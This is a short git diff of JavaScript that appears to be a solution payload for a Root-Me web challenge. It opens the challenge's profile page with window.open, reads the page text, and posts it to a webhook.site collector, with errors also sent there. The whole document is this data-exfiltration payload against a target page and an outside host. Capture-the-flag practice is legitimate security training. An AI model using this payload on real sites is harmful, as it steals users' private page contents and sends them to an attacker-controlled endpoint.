@@ -1,3 +1,5 @@
+// https://tim-xd.github.io/web-client/index.html
+
 const PROFILE = "http://challenge01.root-me.org:58003/profile";
 const WEBHOOK = "https://webhook.site/abaf4f7a-3e2f-4fb6-aebd-9076e261d651?";
 
@@ -14,7 +16,8 @@ function post(url, data) {
 }
 
 try {
-  post(WEBHOOK, get(PROFILE));
+  const o = window.open(PROFILE);
+  post(WEBHOOK, o.document.body.innerText);
 } catch (error) {
-  post(WEBHOOK, error);
+  post(WEBHOOK, `Error: ${error}`);
 }
